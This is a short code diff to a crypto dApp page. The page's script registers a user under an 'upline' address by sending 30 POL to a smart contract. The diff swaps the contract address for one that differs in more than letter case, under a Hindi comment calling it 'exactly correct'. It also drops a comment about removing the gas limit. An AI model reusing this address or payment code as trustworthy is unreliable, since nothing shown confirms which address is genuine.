@@ -367,7 +367,8 @@
 
     <!-- MAIN JAVASCRIPT LOGIC -->
     <script>
-        const CONTRACT_ADDRESS = "0x2bd2b4d2d2379ce31c62f35813bd05863980be05";
+        // EK DUM SAHI CONTRACT ADDRESS BINA KISI GHALTI KE
+        const CONTRACT_ADDRESS = "0x2BD2B4D2D2379Ce31c62f35813BD05863980BE85";
         
         const CONTRACT_ABI = [
             "function register(address _upline) external payable",
@@ -913,7 +914,6 @@
                         
                         masterConnectBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Confirm 30 POL...';
                         
-                        // YAHAN BADLAAV HAI: Gas limit hatayi gayi hai
                         const txValue = ethers.utils.parseEther("30");
                         const tx = await contract.register(uplineAddr, { value: txValue });
                         
